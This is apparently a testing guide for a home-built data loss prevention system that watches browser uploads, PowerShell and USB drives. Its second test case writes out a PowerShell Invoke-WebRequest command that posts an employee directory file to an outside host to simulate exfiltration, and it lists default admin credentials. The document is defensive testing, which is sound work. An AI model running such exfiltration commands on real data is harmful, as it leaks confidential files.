# 🛡️ Enterprise Data Loss Prevention (DLP) Agent
**Testing & Evaluation Guide**

Welcome to the Enterprise DLP Project! This system is a full-stack, AI-powered cybersecurity platform designed to detect and block insider threats from stealing sensitive corporate data (like passwords, credit cards, or internal directory files). 

It operates across three distinct threat vectors:
1. **The Network (Browser):** A custom Chrome/Edge extension that inspects encrypted HTTPS uploads.
2. **The Endpoint (PowerShell):** A background OS-level monitor that intercepts command-line exfiltration.
3. **The Physical Layer (USB):** A device manager that instantly wipes restricted files dropped onto unauthorized USB drives.

---

## 🛠️ Step 1: System Setup
To test this system, you need to run three separate components.

### 1. Start the Central Dashboard
This is the central Security Operations Center (SOC) where all alerts arrive.
1. Open a PowerShell terminal in this folder.
2. Run: `python -m dlp_agent dashboard`
3. Open your browser and go to `http://127.0.0.1:8080`
4. Log in using the admin credentials. (The default credentials are `admin` / `Admin123!`).

### 2. Start the OS Background Monitor
This is the invisible endpoint agent that monitors PowerShell and USB drives.
1. Open a *second* PowerShell terminal in this folder.
2. Run: `python -m dlp_agent monitor`
3. Leave this running in the background.

### 3. Install the Browser Extension
This intercepts rogue web uploads.
1. Open Google Chrome or Microsoft Edge.
2. Go to `chrome://extensions` (or `edge://extensions`).
3. Enable **Developer mode** (usually a toggle in the top right).
4. Click **Load unpacked**.
5. Select the `browser_extension` folder located inside the `dlp_agent` directory.
6. Make sure the extension toggle is turned ON.

---

## 🧪 Step 2: Running the Test Cases

### Test Case 1: Browser Exfiltration (The Insider Threat)
*Scenario: A rogue employee tries to upload a list of company passwords to their personal web server via a browser.*

1. In your browser, navigate to any file upload page (e.g., your Kali Linux VM upload server, or any testing upload form).
2. Attempt to upload one of the sensitive files from the `synthetic_test_data` folder (like `05_financial_report.txt` or `01_internal_employee_directory.csv`).
3. **Expected Result:** A massive red "DLP BLOCK" popup will hijack your browser window. The file transfer will be killed locally before it ever reaches the server.
4. **Check the Dashboard:** Go to your Dashboard at `http://127.0.0.1:8080`. You will see a new High-Risk incident. You can click on it to see exactly why it was blocked.

### Test Case 2: PowerShell Exfiltration (The Hacker)
*Scenario: An advanced attacker bypasses the browser and uses a command-line script to quietly siphon data to an external IP.*

1. Open a *third* PowerShell terminal.
2. Run the following command to simulate a malicious data exfiltration:
   ```powershell
   powershell -Command "Invoke-WebRequest -Uri http://example.com -Method Post -InFile 'synthetic_test_data\01_internal_employee_directory.csv'"
   ```
3. **Expected Result:** The `dlp_agent monitor` process detects the PowerShell transfer command, scans the `-InFile` path, and suspends that exact PowerShell process while it waits for an SOC decision.
4. **Check the Dashboard:** Open the new "Network Connection" alert. Choose **Block** to terminate the verified PowerShell process and its children, or choose **Allow** to resume it. The incident shows the PID, destination, enforcement state, and masked sensitive-data findings.

### Test Case 3: USB Exfiltration (The Physical Theft)
*Scenario: An employee plugs in an unregistered thumb drive and attempts to copy financial data onto it.*

1. Plug a standard USB Thumb Drive into your computer. 
2. Go to your Dashboard, click on **Devices** on the left menu. You will see your USB drive automatically register as **"Unauthorized"**.
3. Open Windows File Explorer.
4. Drag and drop `05_financial_report.txt` onto your USB drive.
5. **Expected Result:** Within one second, the background agent will detect the file transfer, scan the file in transit, realize it is highly confidential, and **instantly delete the file from the USB drive**. It will then forcefully eject the USB drive from your computer to prevent further theft.
6. **Check the Dashboard:** A critical alert will appear in the dashboard documenting the exact device serial number and the file that was deleted.

---

### 🎉 Conclusion
You can safely test the workflow by clicking into any Incident on the Dashboard, assigning it to an Analyst, generating an AI Analysis of the threat, and ultimately changing the status to "Resolved". (Notice how it moves to the History tab!). 

Have fun testing!
